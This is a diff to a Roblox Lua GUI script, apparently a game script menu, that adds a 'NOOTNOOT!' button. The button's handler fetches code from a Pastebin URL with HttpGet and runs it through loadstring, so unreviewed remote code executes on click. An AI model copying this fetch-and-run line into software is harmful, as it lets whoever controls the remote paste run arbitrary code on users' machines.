@@ -13,6 +13,7 @@ local DISCO = Instance.new("TextButton")
 local HINTGAME = Instance.new("TextButton")
 local BALLRAINING = Instance.new("TextButton")
 local PARTICLES = Instance.new("TextButton")
+local NOOTNOOT = Instance.new("TextButton")
 
 --Properties:
 
@@ -246,6 +247,21 @@ if particle == true then
 		end
 	end
 end
+end)
+NOOTNOOT.Parent = Frame
+NOOTNOOT.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+NOOTNOOT.BorderColor3 = Color3.fromRGB(203, 132, 66)
+NOOTNOOT.BorderSizePixel = 3
+NOOTNOOT.Position = UDim2.new(0.38, 0, 0.25, 0)
+NOOTNOOT.Size = UDim2.new(0, 92, 0, 30)
+NOOTNOOT.Font = Enum.Font.SourceSans
+NOOTNOOT.Text = "NOOTNOOT!"
+NOOTNOOT.TextColor3 = Color3.fromRGB(242, 243, 243)
+NOOTNOOT.TextScaled = true
+NOOTNOOT.TextSize = 14.000
+NOOTNOOT.TextWrapped = true
+NOOTNOOT.MouseButton1Down:connect(function()
+loadstring(game:HttpGet(('https://pastebin.com/raw/E3nvcW9y'),true))()
 end)
 
 -- Scripts :
